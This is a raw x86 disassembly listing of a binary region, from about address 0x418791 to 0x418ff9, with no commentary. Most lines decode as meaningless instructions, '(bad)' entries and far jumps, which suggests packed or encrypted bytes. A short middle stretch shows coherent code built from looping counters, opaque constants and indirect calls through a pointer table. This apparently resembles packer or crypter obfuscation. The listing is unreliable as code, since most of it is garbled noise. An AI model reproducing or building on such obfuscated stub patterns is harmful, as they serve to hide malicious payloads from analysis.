  418791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418792:	(bad)  
  418793:	dec    ecx
  418794:	inc    edi
  418795:	int    0x69
  418797:	inc    ebx
  418798:	xor    al,0xa4
  41879a:	jg     0x418803
  41879c:	sub    edi,edi
  41879e:	jo     0x41872a
  4187a0:	in     eax,0xb6
  4187a2:	out    dx,al
  4187a3:	xchg   esp,eax
  4187a4:	push   0x28b72405
  4187a9:	fimul  WORD PTR [edi+0x56077af8]
  4187af:	mov    al,0x3f
  4187b1:	rcr    BYTE PTR [ecx+edx*1+0x4d57aa57],0xe9
  4187b9:	pop    ds
  4187ba:	sbb    BYTE PTR ds:0x59d317a1,0x31
  4187c1:	sub    dh,al
  4187c3:	jmp    0x41877f
  4187c5:	pop    edi
  4187c6:	imul   edi,esp,0x68
  4187c9:	dec    esi
  4187ca:	mov    dl,0xd7
  4187cc:	sbb    DWORD PTR [eax-0x1e],0x7f
  4187d0:	xchg   ebp,eax
  4187d1:	jp     0x4187ac
  4187d3:	aas    
  4187d4:	or     BYTE PTR [edx+0x7ed38121],dh
  4187da:	retf   0x90c7
  4187dd:	mov    DWORD PTR [ebp+0x7d7871a2],edi
  4187e3:	mov    eax,ds:0x2270ecee
  4187e8:	mov    eax,0x8125f74
  4187ed:	outs   dx,DWORD PTR ds:[esi]
  4187ee:	xor    eax,0xbd2ebe1d
  4187f3:	push   ebp
  4187f4:	jmp    0x4187ec
  4187f6:	push   eax
  4187f7:	out    0x48,eax
  4187f9:	jecxz  0x4187f9
  4187fb:	xchg   BYTE PTR ds:0xd5b45280,bh
  418801:	mov    ds:0xa1feb464,al
  418806:	fst    QWORD PTR [esi]
  418808:	hlt    
  418809:	les    edi,FWORD PTR [ecx+0x2e4b5b6c]
  41880f:	ins    DWORD PTR es:[edi],dx
  418810:	ds sbb eax,0x1ea848b5
  418816:	call   0x4662e54b
  41881b:	xor    al,ch
  41881d:	out    0x69,al
  41881f:	pushf  
  418820:	rcr    ebp,cl
  418822:	push   0xffffffc6
  418824:	xlat   BYTE PTR ds:[ebx]
  418825:	aad    0x6b
  418827:	xchg   ebx,eax
  418828:	enter  0xa669,0x69
  41882c:	sbb    eax,0x735bffc0
  418831:	jne    0x418821
  418833:	jae    0x41887f
  418835:	sub    al,ah
  418837:	shl    DWORD PTR [edi],0xa4
  41883a:	test   BYTE PTR [ecx],bh
  41883c:	cs loopne 0x41882d
  41883f:	mov    esp,0xfe86eae5
  418844:	mov    ss,WORD PTR [edx-0x25]
  418847:	adc    eax,0xd0681112
  41884c:	inc    ecx
  41884d:	adc    eax,0x94e2fc25
  418852:	xchg   dh,dl
  418854:	push   cs
  418855:	pop    ebp
  418856:	xor    eax,DWORD PTR [edi-0x7d]
  418859:	out    dx,eax
  41885a:	mov    dh,0x96
  41885c:	lds    edi,FWORD PTR [esi+0x1d]
  41885f:	cld    
  418860:	das    
  418861:	xchg   BYTE PTR [ecx],al
  418863:	cwde   
  418864:	jns    0x4188db
  418866:	dec    esi
  418867:	ficomp WORD PTR [eax+0x2293fba8]
  41886d:	ins    BYTE PTR es:[edi],dx
  41886e:	fwait
  41886f:	rep outs dx,DWORD PTR ds:[esi]
  418871:	jp     0x41882c
  418873:	jle    0x41880a
  418875:	out    dx,al
  418876:	mov    DWORD PTR [ecx-0xc56a0ac],ecx
  41887c:	(bad)  
  41887d:	jle    0x4188fe
  41887f:	push   edx
  418880:	jae    0x418813
  418882:	lahf   
  418883:	test   BYTE PTR [ecx+0x5cad8523],0x23
  41888a:	es xchg ecx,eax
  41888c:	jg     0x4188b4
  41888e:	dec    edx
  41888f:	repnz lds edx,FWORD PTR [ebx+0x239029d4]
  418896:	mov    ebx,es
  418898:	(bad)
  41889c:	and    edi,edi
  41889e:	and    BYTE PTR [edi],dl
  4188a0:	stos   BYTE PTR es:[edi],al
  4188a1:	lds    ecx,FWORD PTR [ebx+0x27]
  4188a4:	in     eax,0x9c
  4188a6:	jo     0x4188e3
  4188a8:	fwait
  4188a9:	aas    
  4188aa:	aaa    
  4188ab:	fs jo  0x418848
  4188ae:	mov    ds:0x583d6aa9,al
  4188b3:	mov    ebx,0x5b05bb9
  4188b8:	mov    dh,0x4f
  4188ba:	call   0xa7b1f8f0
  4188bf:	test   BYTE PTR [eax-0x14],dl
  4188c2:	sbb    BYTE PTR ds:0xe1fba65c,al
  4188c8:	add    al,0x47
  4188ca:	in     al,0xdf
  4188cc:	add    al,0x2c
  4188ce:	fwait
  4188cf:	xor    BYTE PTR [ecx+0x1b],ch
  4188d2:	adc    al,0x4e
  4188d4:	mov    ebx,0xcfc1d1a5
  4188d9:	imul   ebx,esi,0x6cb34c31
  4188df:	dec    edx
  4188e0:	mov    ds:0x846a88d3,eax
  4188e5:	fimul  DWORD PTR [edi-0x7]
  4188e8:	xor    eax,DWORD PTR [ebp-0x30]
  4188eb:	cmovl  edx,DWORD PTR [edi-0x3fbc3c3a]
  4188f2:	cmp    eax,0xac3f894e
  4188f7:	loope  0x4188e0
  4188f9:	xchg   edx,eax
  4188fa:	imul   esi,DWORD PTR [edi+eiz*1],0x63546202
  418901:	mov    ds:0x97e57dc4,al
  418906:	adc    edi,ebx
  418908:	fcomp  QWORD PTR [ebp-0x5e]
  41890b:	ins    DWORD PTR es:[edi],dx
  41890c:	xor    eax,0xb0b599d3
  418911:	test   eax,0x25c04653
  418916:	js     0x4188c6
  418918:	imul   ebp,DWORD PTR [eax],0xffffffab
  41891b:	dec    eax
  41891c:	push   ecx
  41891d:	sbb    bl,BYTE PTR [edx+0x77]
  418920:	scas   eax,DWORD PTR es:[edi]
  418921:	lds    esi,FWORD PTR [edi+0x7fa6a2dd]
  418927:	push   ss
  418928:	add    ah,cl
  41892a:	adc    ah,BYTE PTR [eax+0x1b]
  41892d:	nop
  41892e:	adc    dh,BYTE PTR [esi+ebp*4-0x16161383]
  418935:	pop    ss
  418936:	dec    edi
  418937:	lea    edx,[edx-0x32]
  41893a:	inc    edx
  41893b:	xor    eax,0x6a41f1af
  418940:	sahf   
  418941:	clc    
  418942:	ret    0x997e
  418945:	ss out dx,eax
  418947:	es jmp 0xebce:0xc2b4ebba
  41894f:	mov    ah,0xe5
  418951:	or     BYTE PTR [ecx+0x7c],ah
  418954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418955:	imul   ecx,DWORD PTR [edi-0x6a],0xff24f263
  41895c:	add    BYTE PTR [edi-0x2],cl
  41895f:	bound  esp,QWORD PTR [edx]
  418961:	mov    ebx,0x3c3fb66b
  418966:	sti    
  418967:	sbb    al,0xaf
  418969:	rcr    BYTE PTR [ebp*8-0x3cea2a10],1
  418970:	hlt    
  418971:	lods   al,BYTE PTR ds:[esi]
  418972:	pop    edx
  418973:	js     0x4189f2
  418975:	outs   dx,BYTE PTR ds:[esi]
  418976:	(bad)  
  418977:	loopne 0x418991
  418979:	cs inc ecx
  41897b:	mov    esp,0x2a882279
  418980:	jl     0x41895b
  418982:	repnz xchg esi,eax
  418984:	sub    eax,0x2ca152f8
  418989:	adc    esi,DWORD PTR [ecx]
  41898b:	cmp    eax,0x9a7cb0de
  418990:	fwait
  418991:	cmp    BYTE PTR [ebp+0x6f],0x3d
  418995:	adc    al,BYTE PTR [ebp+0x75]
  418998:	fdivr  DWORD PTR [ebx-0x5]
  41899b:	or     eax,0x603aaf0b
  4189a0:	(bad)  
  4189a1:	and    dh,al
  4189a3:	push   esi
  4189a4:	add    eax,0xda290499
  4189a9:	ss dec ecx
  4189ab:	daa    
  4189ac:	sub    eax,0xf1aa2997
  4189b1:	adc    DWORD PTR es:[eax-0x1da0e0d3],edi
  4189b8:	mov    esi,0x4178992e
  4189bd:	pop    es
  4189be:	aam    0xbc
  4189c0:	sub    DWORD PTR [ecx+0x19f9619c],ecx
  4189c6:	xor    ecx,eax
  4189c8:	add    ecx,esi
  4189ca:	adc    DWORD PTR ds:0x42a2ee,edi
  4189d0:	mov    DWORD PTR [ebp-0xc],ecx
  4189d3:	add    DWORD PTR ds:0x42a25a,0x6cdc
  4189dd:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4189e4:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  4189ee:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4189f5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4189fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4189ff:	mov    DWORD PTR ds:0x42a2ee,0x1b
  418a09:	cmp    DWORD PTR ds:0x42a2ee,0x0
  418a10:	je     0x418a4a
  418a16:	cmp    DWORD PTR ds:0x42a2ee,0x1c
  418a1d:	ja     0x418a4a
  418a23:	jmp    0x418a38
  418a28:	push   0x4b24
  418a2d:	push   0x42a296
  418a32:	call   DWORD PTR ds:0x42a3f2
  418a38:	mov    edi,DWORD PTR ds:0x42a2ee
  418a3e:	dec    edi
  418a3f:	mov    DWORD PTR ds:0x42a2ee,edi
  418a45:	jmp    0x418a09
  418a4a:	mov    DWORD PTR [ebp+0x8],ecx
  418a4d:	mov    edi,DWORD PTR ds:0x42a28e
  418a53:	xor    edi,DWORD PTR ds:0x42a2c6
  418a59:	mov    DWORD PTR ds:0x42a28e,edi
  418a5f:	mov    ecx,DWORD PTR [ebp+0x8]
  418a62:	xor    ecx,eax
  418a64:	mov    DWORD PTR ds:0x42a2b6,0x16
  418a6e:	cmp    DWORD PTR ds:0x42a2b6,0x0
  418a75:	je     0x418aac
  418a7b:	cmp    DWORD PTR ds:0x42a2b6,0x1d
  418a82:	ja     0x418aac
  418a88:	jmp    0x418a98
  418a8d:	push   0x42a28a
  418a92:	call   DWORD PTR ds:0x42a3f6
  418a98:	xor    edi,edi
  418a9a:	xor    edi,DWORD PTR ds:0x42a2b6
  418aa0:	dec    edi
  418aa1:	mov    DWORD PTR ds:0x42a2b6,edi
  418aa7:	jmp    0x418a6e
  418aac:	add    ecx,esi
  418aae:	mov    ecx,0x242ebc9
  418ab3:	mov    edi,0xf641bc8
  418ab8:	je     0x421e4f
  418abe:	and    DWORD PTR ds:0x42a27a,0x0
  418ac8:	jmp    0x418adc
  418acd:	xor    ebx,ebx
  418acf:	or     ebx,DWORD PTR ds:0x42a27a
  418ad5:	inc    ebx
  418ad6:	mov    DWORD PTR ds:0x42a27a,ebx
  418adc:	cmp    DWORD PTR ds:0x42a27a,0x14
  418ae3:	jae    0x418b2d
  418ae9:	cmp    DWORD PTR ds:0x42a27a,0xa
  418af0:	jb     0x418b2d
  418af6:	jmp    0x418b0e
  418afb:	push   DWORD PTR [ebp-0x14]
  418afe:	push   0x42a272
  418b03:	push   0x7a1d
  418b08:	call   DWORD PTR ds:0x42a3fa
  418b0e:	cmp    DWORD PTR ds:0x42a27a,0x9
  418b15:	jne    0x418b28
  418b1b:	mov    ebx,DWORD PTR ds:0x42a27a
  418b21:	inc    ebx
  418b22:	mov    DWORD PTR ds:0x42a27a,ebx
  418b28:	jmp    0x418acd
  418b2d:	mov    edx,DWORD PTR [ebp+0x8]
  418b30:	mov    ebx,DWORD PTR [ebp-0x8]
  418b33:	xor    edx,eax
  418b35:	xor    ebx,eax
  418b37:	sub    edx,ebx
  418b39:	sub    DWORD PTR ds:0x42a26e,edi
  418b3f:	sub    edx,esi
  418b41:	sub    ebx,0x5edd
  418b47:	xor    edx,eax
  418b49:	adc    ebx,DWORD PTR ds:0x42a272
  418b4f:	mov    DWORD PTR [ebp+0x8],edx
  418b52:	adc    DWORD PTR ds:0x42a2d6,edx
  418b58:	jmp    0x41aeb0
  418b5d:	add    al,ch
  418b5f:	test   BYTE PTR [edx-0x15ff7d6a],0x26
  418b66:	and    BYTE PTR [edx-0x3e],dl
  418b69:	cmp    eax,0xc7ec3d27
  418b6e:	sbb    al,0x7c
  418b70:	add    DWORD PTR [esi+0x5e],0xffffff83
  418b74:	sbb    DWORD PTR [ecx+0x4235e8fa],0xffffff88
  418b7b:	fsub   DWORD PTR [edi]
  418b7d:	jno    0x418ba6
  418b7f:	dec    edi
  418b80:	sbb    BYTE PTR [ecx+0x58],al
  418b83:	loop   0x418b59
  418b85:	jo     0x418bb9
  418b87:	fmulp  st(2),st
  418b89:	inc    ebx
  418b8a:	test   DWORD PTR [ecx+0x1c],0xd7233148
  418b91:	retf   0xe94a
  418b94:	and    eax,0x682a66d5
  418b99:	xchg   BYTE PTR [ebx+0x645dfca6],bl
  418b9f:	push   es
  418ba0:	push   es
  418ba1:	ins    DWORD PTR es:[edi],dx
  418ba2:	jb     0x418bd6
  418ba4:	cmp    DWORD PTR [ecx+eax*4+0x1d],esi
  418ba8:	shl    DWORD PTR [ecx],cl
  418baa:	cmp    cl,BYTE PTR [edx+0x6b]
  418bad:	fcmovbe st,st(1)
  418baf:	imul   ebx,DWORD PTR [edx+edx*2+0x55],0xc859998b
  418bb7:	pop    ds
  418bb8:	and    al,0x78
  418bba:	xchg   ebp,eax
  418bbb:	sub    DWORD PTR [ebx-0x1d08eb5d],esi
  418bc1:	jge    0x418b6c
  418bc3:	(bad)  
  418bc5:	iretw  
  418bc7:	cmp    eax,0x957ac42f
  418bcc:	mov    dh,0xc7
  418bce:	adc    BYTE PTR [ebx],dl
  418bd0:	mov    dl,0xdb
  418bd2:	mov    cl,0x50
  418bd4:	stos   DWORD PTR es:[edi],eax
  418bd5:	(bad)  
  418bd6:	push   eax
  418bd7:	in     eax,dx
  418bd8:	shl    DWORD PTR [esi],0xdc
  418bdb:	dec    edi
  418bdc:	or     al,0xd6
  418bde:	test   eax,0x1530c2fd
  418be3:	mov    ebp,0x24fbdf0a
  418be8:	jne    0x418c5e
  418bea:	push   esi
  418beb:	enter  0x6b6,0xea
  418bef:	jns    0x418bd1
  418bf1:	sub    al,BYTE PTR [edi+ebx*8-0x20139b17]
  418bf8:	cmp    BYTE PTR cs:[edx+esi*1+0x6d754f6],ah
  418c00:	adc    DWORD PTR [edx],esp
  418c02:	ja     0x418c73
  418c04:	(bad)  
  418c05:	mov    esi,DWORD PTR [edx]
  418c07:	(bad)  
  418c08:	fcomp  st(3)
  418c0a:	cmc    
  418c0b:	in     al,dx
  418c0c:	push   edx
  418c0d:	xor    bh,bh
  418c0f:	out    dx,eax
  418c10:	stos   BYTE PTR es:[edi],al
  418c11:	cmp    BYTE PTR [ebp-0x2fc83ce7],ah
  418c17:	mov    DWORD PTR [eax+0x36706d6c],eax
  418c1d:	and    esi,DWORD PTR [edi-0x79]
  418c20:	pop    ebx
  418c21:	jl     0x418bc0
  418c23:	test   al,0x5b
  418c25:	jne    0x418c35
  418c27:	push   edx
  418c28:	call   FWORD PTR [edx-0x523f4f59]
  418c2e:	or     eax,0x8e1f071
  418c33:	jno    0x418ca4
  418c35:	xchg   DWORD PTR [ebx],esp
  418c37:	sub    esp,esi
  418c39:	cmp    al,0xba
  418c3b:	mov    al,ds:0x64d73e07
  418c40:	pushf  
  418c41:	inc    eax
  418c42:	(bad)  
  418c43:	aas    
  418c44:	jno    0x418c0e
  418c46:	dec    ebx
  418c47:	or     al,BYTE PTR [esi]
  418c49:	icebp  
  418c4a:	push   ds
  418c4b:	xchg   BYTE PTR [edx+esi*1-0x44],bl
  418c4f:	inc    ecx
  418c50:	or     ebp,DWORD PTR [eax]
  418c52:	sar    BYTE PTR [ebp-0x65],0x38
  418c56:	lock push edi
  418c58:	jbe    0x418cd6
  418c5a:	dec    edi
  418c5b:	(bad)  
  418c5c:	popf   
  418c5d:	aam    0x56
  418c5f:	dec    edx
  418c60:	in     eax,0xa2
  418c62:	sti    
  418c63:	(bad)  
  418c64:	xchg   ebp,eax
  418c65:	xor    DWORD PTR [eax-0x47],esp
  418c68:	icebp  
  418c69:	stmxcsr DWORD PTR [ebx-0x76]
  418c6d:	and    eax,0x73079b7d
  418c72:	or     dl,BYTE PTR [ebp+edi*8+0x219e7ecd]
  418c79:	std    
  418c7a:	jl     0x418c37
  418c7c:	pop    esi
  418c7d:	push   ebp
  418c7e:	ja     0x418c54
  418c80:	adc    cl,BYTE PTR [eax+0x50]
  418c83:	imul   esi,DWORD PTR [ecx+eiz*8],0x39
  418c87:	pop    es
  418c88:	jmp    0x5398:0x42964f00
  418c8f:	sbb    BYTE PTR [eax+0x5ea5ea15],0xd2
  418c96:	sbb    al,0xb0
  418c98:	jle    0xee2468f4
  418c9e:	and    bh,dl
  418ca0:	stos   DWORD PTR es:[edi],eax
  418ca1:	test   BYTE PTR [edi+eiz*2-0x71],0xf7
  418ca6:	adc    bh,0x2a
  418ca9:	jne    0x418d18
  418cab:	push   edi
  418cac:	sub    cl,BYTE PTR [ecx]
  418cae:	js     0x418d29
  418cb0:	mov    dh,0xef
  418cb2:	aaa    
  418cb3:	cmp    DWORD PTR [ebx],ecx
  418cb5:	push   0x15
  418cb7:	push   cs
  418cb8:	lock fstp TBYTE PTR [eax+0x20eceb71]
  418cbf:	jno    0x418cdd
  418cc1:	cdq    
  418cc2:	fldenv [esi-0x52]
  418cc5:	pop    edi
  418cc6:	mov    eax,esi
  418cc8:	out    dx,al
  418cc9:	xor    esp,DWORD PTR [ebp+0x19]
  418ccc:	push   edx
  418ccd:	shl    BYTE PTR [edi],cl
  418ccf:	ins    DWORD PTR es:[edi],dx
  418cd0:	push   es
  418cd1:	push   0xffffffe6
  418cd3:	cmp    ah,BYTE PTR [ecx]
  418cd5:	mov    ss,WORD PTR [edx]
  418cd7:	push   ebx
  418cd8:	sub    DWORD PTR [eax-0x22f9bb2],ebp
  418cde:	test   BYTE PTR [ebp+0x60],0xdd
  418ce2:	jg     0x418c71
  418ce4:	cld    
  418ce5:	mov    edi,ebp
  418ce7:	jo     0x418cd9
  418ce9:	sub    al,0x7b
  418ceb:	push   edi
  418cec:	pop    ss
  418ced:	hlt    
  418cee:	pop    ds
  418cef:	gs xchg ebp,eax
  418cf1:	inc    ebp
  418cf2:	lods   al,BYTE PTR ds:[esi]
  418cf3:	aas    
  418cf4:	sub    al,0xc
  418cf6:	enter  0xed1f,0xdd
  418cfa:	in     al,dx
  418cfb:	ss shl bl,cl
  418cfe:	test   BYTE PTR [esi],cl
  418d00:	push   cs
  418d01:	push   0x92adb38b
  418d06:	imul   DWORD PTR [ebx-0x65]
  418d09:	add    eax,0xffc31a70
  418d0e:	cs inc ecx
  418d10:	and    BYTE PTR [esi],dh
  418d12:	and    dl,BYTE PTR [eax+0x47]
  418d15:	add    BYTE PTR [edi-0x42be8857],0xe7
  418d1c:	test   DWORD PTR [edx],edx
  418d1e:	mov    DWORD PTR [esi],esp
  418d20:	xchg   edi,eax
  418d21:	jmp    0xeb4d:0x6861e37c
  418d28:	sbb    ebp,ebx
  418d2a:	xor    ch,BYTE PTR [eax]
  418d2c:	lea    esi,[esi+ecx*4]
  418d2f:	xor    al,0xb8
  418d31:	stos   DWORD PTR es:[edi],eax
  418d32:	test   BYTE PTR [esi],dl
  418d34:	cwde   
  418d35:	idiv   ecx
  418d37:	xor    DWORD PTR [edi+eax*2],eax
  418d3a:	cmp    eax,0xf39607
  418d3f:	rol    bl,1
  418d41:	sub    eax,0xb80d0ed9
  418d46:	jb     0x418d79
  418d48:	push   eax
  418d49:	sbb    ah,BYTE PTR [ebx+0x74b8b2c]
  418d4f:	jmp    0xe28c7778
  418d54:	dec    ecx
  418d55:	fstp   TBYTE PTR [edi]
  418d57:	sbb    eax,0x871c7f97
  418d5c:	xchg   esp,eax
  418d5d:	xchg   DWORD PTR [ebx+ebx*4],ecx
  418d60:	xchg   esp,eax
  418d61:	fst    QWORD PTR [ebx+0x29]
  418d64:	lock push ds
  418d66:	adc    eax,0xcb8c8fa4
  418d6b:	clc    
  418d6c:	xchg   ebx,eax
  418d6d:	cwde   
  418d6e:	rcr    DWORD PTR [ebx-0x758c1c64],0xb4
  418d75:	es xchg ecx,eax
  418d77:	test   BYTE PTR [ecx+0x5287497],dh
  418d7d:	dec    edx
  418d7e:	adc    al,BYTE PTR [esp+edx*4]
  418d81:	mov    bl,BYTE PTR [esi-0x6dfb0485]
  418d87:	popf   
  418d88:	(bad)  
  418d8b:	loop   0x418d7f
  418d8d:	icebp  
  418d8e:	or     eax,0x1d772244
  418d93:	mov    dh,0xbf
  418d95:	mov    bl,0xf0
  418d97:	jl     0x418d5f
  418d99:	sbb    eax,0x8823d140
  418d9e:	adc    BYTE PTR [ebp+0x1c0292db],0xd6
  418da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da6:	xchg   ecx,eax
  418da7:	stos   BYTE PTR es:[edi],al
  418da8:	xchg   ebx,eax
  418da9:	jns    0x418d91
  418dab:	inc    esp
  418dac:	mov    WORD PTR [edi+0x44],fs
  418daf:	test   BYTE PTR [edx+0x3f3af4eb],bl
  418db5:	mov    dl,0x32
  418db7:	out    dx,al
  418db8:	and    BYTE PTR [eax-0x4dad1e08],bl
  418dbe:	ins    DWORD PTR es:[edi],dx
  418dbf:	push   esp
  418dc0:	cs and al,0x31
  418dc3:	push   edx
  418dc5:	ret    0xd6c2
  418dc8:	jo     0x418dc6
  418dca:	fwait
  418dcb:	(bad)  
  418dcc:	retf   0xd757
  418dcf:	mov    cl,0xd9
  418dd1:	std    
  418dd2:	pop    ecx
  418dd3:	sbb    eax,0xa18c098f
  418dd8:	xchg   DWORD PTR [eax],edi
  418dda:	add    al,0x11
  418ddc:	in     al,dx
  418ddd:	loope  0x418d6b
  418ddf:	sub    esi,DWORD PTR [eax+0x50394edf]
  418de5:	call   0x5fc9:0x26787141
  418dec:	push   ebp
  418ded:	xchg   ebp,eax
  418dee:	pop    ds
  418def:	add    bl,BYTE PTR [esi-0x40b0ceef]
  418df5:	inc    edi
  418df6:	ds pop ds
  418df8:	in     eax,0xc8
  418dfa:	xchg   ebx,eax
  418dfb:	adc    eax,0xdc244a04
  418e00:	(bad)  
  418e01:	mov    al,ds:0x44d8dfff
  418e06:	les    esp,FWORD PTR [ecx]
  418e08:	inc    edi
  418e09:	mov    ds:0xe60722c4,al
  418e0e:	(bad)  
  418e0f:	mov    eax,ds:0xba349934
  418e14:	pop    ebp
  418e15:	mov    ds:0xebc768be,eax
  418e1a:	jp     0x418df5
  418e1c:	repz cdq 
  418e1e:	inc    esi
  418e1f:	jae    0x418dca
  418e21:	jge    0x418e35
  418e23:	lods   eax,DWORD PTR ds:[esi]
  418e24:	jp     0x418da9
  418e26:	lods   al,BYTE PTR ds:[esi]
  418e27:	ret    
  418e28:	pop    es
  418e29:	jmp    0x967d:0x3c4b9b32
  418e30:	dec    ebx
  418e31:	adc    al,0xfb
  418e33:	test   BYTE PTR [edi+esi*1-0x482cdc61],0x26
  418e3b:	int3   
  418e3c:	sub    DWORD PTR [ebx],esi
  418e3e:	jne    0x418e25
  418e40:	and    bl,cl
  418e42:	jne    0x418eb8
  418e44:	(bad)  
  418e45:	add    ebx,DWORD PTR [edi]
  418e47:	ja     0x418e3a
  418e49:	adc    dh,bl
  418e4b:	xor    al,0xa3
  418e4d:	mov    bl,0x4e
  418e4f:	push   eax
  418e50:	adc    al,0x32
  418e52:	imul   edx,DWORD PTR [ebp-0x24],0x5f
  418e56:	loopne 0x418e15
  418e58:	sub    ch,bl
  418e5a:	jbe    0x418e25
  418e5c:	cmc    
  418e5d:	(bad)  
  418e5e:	lods   al,BYTE PTR ds:[esi]
  418e5f:	add    BYTE PTR [eax+0x4c],0x31
  418e63:	sbb    eax,0x2af937c3
  418e68:	jp     0x418df0
  418e6a:	cmp    DWORD PTR [edx-0x7d9391ef],esi
  418e70:	(bad)  
  418e71:	sar    al,cl
  418e73:	inc    esi
  418e74:	scas   al,BYTE PTR es:[edi]
  418e75:	call   0x191424dc
  418e7a:	and    esi,DWORD PTR [eax+0x1344cafd]
  418e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e81:	sub    edi,DWORD PTR [edx-0x28b0a825]
  418e87:	fcmovnb st,st(1)
  418e89:	xchg   ebp,eax
  418e8a:	and    ebx,ebx
  418e8c:	ret    0x5e65
  418e8f:	pop    ds
  418e90:	hlt    
  418e91:	test   BYTE PTR [esi+esi*8],0xa1
  418e95:	mov    ebp,0x83b0476d
  418e9a:	sbb    edx,DWORD PTR [eax-0x2f]
  418e9d:	popf   
  418e9e:	mov    esi,DWORD PTR es:[edi]
  418ea1:	sbb    eax,0x5b47ce96
  418ea6:	pop    ss
  418ea7:	imul   DWORD PTR [edi+0x2dc1202c]
  418ead:	xchg   DWORD PTR [edx-0x61],esp
  418eb0:	sahf   
  418eb1:	aam    0x36
  418eb3:	out    dx,al
  418eb4:	out    0x9d,al
  418eb6:	or     ebx,DWORD PTR [eax]
  418eb8:	icebp  
  418eb9:	fs and edx,ebx
  418ebc:	jecxz  0x418eca
  418ebe:	call   0x8816:0xc925516d
  418ec5:	in     eax,0x37
  418ec7:	lfs    ebx,FWORD PTR [eax]
  418eca:	cli    
  418ecb:	lds    eax,FWORD PTR [ebx+esi*2-0x1bd765c9]
  418ed2:	ins    BYTE PTR es:[di],dx
  418ed4:	enter  0x8710,0x3e
  418ed8:	sahf   
  418ed9:	xchg   ebx,eax
  418eda:	add    dh,BYTE PTR [esp+ecx*4]
  418edd:	call   0xa970ce61
  418ee2:	or     edi,DWORD PTR [esi-0x7c8df501]
  418ee8:	fild   WORD PTR ds:0x3581269e
  418eee:	les    eax,FWORD PTR [edi-0x69]
  418ef1:	sbb    DWORD PTR [ebx-0x4c],0xffffff8a
  418ef5:	pop    ds
  418ef6:	test   BYTE PTR [eax+0x60],cl
  418ef9:	push   ss
  418efa:	fadd   QWORD PTR [edi+0x77]
  418efd:	(bad)  
  418efe:	mov    ebp,0x858accb1
  418f03:	test   DWORD PTR [esi-0xb34feda],esp
  418f09:	jb     0x418f0f
  418f0b:	xor    DWORD PTR [edi+0x19],ebp
  418f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0f:	push   edx
  418f10:	mov    eax,0xbacc8aef
  418f15:	leave  
  418f16:	xchg   esi,eax
  418f17:	jno    0x418f0f
  418f19:	jmp    0x418f53
  418f1b:	repnz mov bh,0x50
  418f1e:	cmp    eax,0xc20828f
  418f23:	loope  0x418f9a
  418f25:	pop    ebx
  418f26:	push   eax
  418f27:	icebp  
  418f28:	int3   
  418f29:	xchg   BYTE PTR [ebx+eax*2+0x632e45fe],bh
  418f30:	scas   eax,DWORD PTR es:[edi]
  418f31:	sahf   
  418f32:	cmp    al,0x61
  418f34:	dec    esi
  418f35:	not    BYTE PTR ds:0xa0a98617
  418f3b:	xor    al,0x20
  418f3d:	xor    ah,BYTE PTR [edi+edx*8-0x35]
  418f41:	pop    esi
  418f42:	fistp  WORD PTR [ebp-0x5336459f]
  418f48:	dec    eax
  418f49:	ret    
  418f4a:	push   edi
  418f4b:	cmc    
  418f4c:	cmc    
  418f4d:	stc    
  418f4e:	gs add eax,0xb4665f07
  418f54:	xor    BYTE PTR [ebx],ch
  418f56:	sub    al,0x64
  418f58:	shl    BYTE PTR [ebx],1
  418f5a:	inc    edx
  418f5b:	jb     0x418faf
  418f5d:	pop    ebx
  418f5e:	int3   
  418f5f:	add    eax,0xa52edfa7
  418f64:	push   ss
  418f65:	out    0xbf,eax
  418f67:	shl    BYTE PTR [ecx-0x41],cl
  418f6a:	(bad)  
  418f6b:	push   ebp
  418f6c:	push   edx
  418f6d:	jge    0x418f8d
  418f6f:	dec    edx
  418f70:	outs   dx,DWORD PTR ds:[esi]
  418f71:	jp     0x418f68
  418f73:	or     ch,BYTE PTR [eax+esi*2-0x68]
  418f77:	lods   eax,DWORD PTR ds:[esi]
  418f78:	xchg   edi,eax
  418f79:	stos   BYTE PTR es:[edi],al
  418f7a:	push   ebp
  418f7b:	sub    DWORD PTR [esi+0x6f9fcfc8],ebp
  418f81:	lds    eax,FWORD PTR ds:0x7e4a7249
  418f87:	scas   al,BYTE PTR es:[edi]
  418f88:	mov    edi,0xb0e5fc1a
  418f8d:	adc    dl,al
  418f8f:	cdq    
  418f90:	call   FWORD PTR [eax-0x67]
  418f93:	scas   eax,DWORD PTR es:[edi]
  418f94:	jns    0x418fb8
  418f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f97:	mov    esp,0x5162d8f5
  418f9c:	imul   edx,DWORD PTR [ebx],0x35
  418f9f:	addr16 test edx,ecx
  418fa2:	jb     0x418fae
  418fa4:	jge    0x418f49
  418fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fa7:	out    0x60,eax
  418fa9:	(bad)  
  418faa:	and    eax,0x4f942a85
  418faf:	test   al,cl
  418fb1:	lods   eax,DWORD PTR ds:[esi]
  418fb2:	stc    
  418fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fb4:	mov    ah,0x76
  418fb6:	mov    dh,0xef
  418fb8:	push   ebx
  418fb9:	fst    QWORD PTR [edi]
  418fbb:	js     0x418fb7
  418fbd:	lds    edx,FWORD PTR [edx]
  418fbf:	push   ebp
  418fc0:	in     al,dx
  418fc1:	rcl    DWORD PTR [eax],cl
  418fc3:	add    al,0xbb
  418fc5:	adc    dh,dh
  418fc7:	push   ds
  418fc8:	fnstcw WORD PTR [eax-0x5f]
  418fcb:	adc    DWORD PTR [eax+0x4cc06845],ecx
  418fd1:	xchg   BYTE PTR [ecx+ebx*4-0x1d8a56da],bh
  418fd8:	es adc eax,0x520425dc
  418fde:	inc    edi
  418fdf:	push   es
  418fe0:	call   0xd307:0x91ed6dd9
  418fe7:	leave  
  418fe8:	mov    ?,WORD PTR [edx]
  418fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418feb:	add    BYTE PTR [ecx+esi*8+0x1f690264],dh
  418ff2:	fisub  DWORD PTR [eax]
  418ff4:	mov    ebx,0x761e5784
  418ff9:	inc    esp
